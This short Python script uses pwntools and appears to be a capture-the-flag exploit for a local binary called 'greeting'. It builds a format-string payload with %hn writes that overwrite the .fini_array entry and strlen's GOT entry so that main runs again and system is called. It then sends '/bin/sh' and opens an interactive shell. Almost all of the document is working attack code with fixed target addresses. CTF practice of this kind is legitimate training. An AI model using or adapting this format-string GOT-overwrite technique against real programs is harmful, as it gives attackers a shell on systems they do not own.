#/usr/bin/python

from pwn import *

r = process('./greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c')
print util.proc.pidof(r)

fini_array = 0x08049934
main_address = 0x80485ed
strlen_got = 0x08049a54
system_plt = 0x8048490

r.recvuntil('name...')
payload = ''
payload += 'aa'
payload += p32(fini_array+2)
payload += p32(strlen_got+2)
payload += p32(strlen_got)
payload += p32(fini_array)
payload += '%2016x%12$hn' + '%13$hn'
payload += '%31884x%14$hn' + '%349x%15$hn'
pause()
r.sendline(payload)

#r.recvuntil('name...')
r.sendline('/bin/sh\x00')

r.interactive()